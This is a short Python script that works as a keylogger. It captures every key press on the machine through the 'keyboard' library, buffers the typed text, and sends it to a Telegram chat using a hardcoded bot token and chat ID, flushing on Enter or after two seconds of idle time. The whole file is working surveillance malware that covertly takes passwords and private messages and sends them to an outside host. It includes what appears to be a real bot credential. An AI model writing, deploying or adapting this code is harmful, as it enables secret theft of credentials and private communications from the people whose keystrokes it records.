import keyboard
import telebot
from datetime import datetime
from threading import Lock, Timer

# Telegram Config
BOT_TOKEN = "7668132689:AAF9u8pHOdiU4bkBURY0yofjLR49XHpt0Vg"
CHAT_ID = "5633755314"
bot = telebot.TeleBot(BOT_TOKEN)

# Text buffer and control variables
text_buffer = ""
buffer_lock = Lock()
last_activity_time = datetime.now()
FLUSH_INTERVAL = 2  # Seconds of inactivity before sending

# Key mappings for special keys
SPECIAL_KEYS = {
    'space': ' ',
    'enter': '\n',
    'tab': '\t',
    'backspace': '[BACKSPACE]'
}

def process_key(event):
    global text_buffer, last_activity_time
    
    key = SPECIAL_KEYS.get(event.name, event.name)
    
    # Handle backspace
    if event.name == 'backspace':
        text_buffer = text_buffer[:-1]
    else:
        text_buffer += key
    
    last_activity_time = datetime.now()

def send_buffer():
    global text_buffer
    with buffer_lock:
        if text_buffer:
            timestamp = datetime.now().strftime("%H:%M:%S")
            message = f"⌨️ [{timestamp}]\n{text_buffer}"
            try:
                bot.send_message(CHAT_ID, message)
                text_buffer = ""  # Clear buffer after sending
            except Exception as e:
                print(f"Telegram Error: {e}")

def check_activity():
    # Send if inactive for FLUSH_INTERVAL seconds
    if (datetime.now() - last_activity_time).seconds >= FLUSH_INTERVAL and text_buffer:
        send_buffer()
    Timer(1, check_activity).start()  # Check every second

# Key press handler
def on_key_press(event):
    process_key(event)
    # Send immediately if Enter was pressed
    if event.name == 'enter':
        send_buffer()

# Start
keyboard.on_press(on_key_press)
check_activity()  # Start the activity checker
keyboard.wait()  # Keep running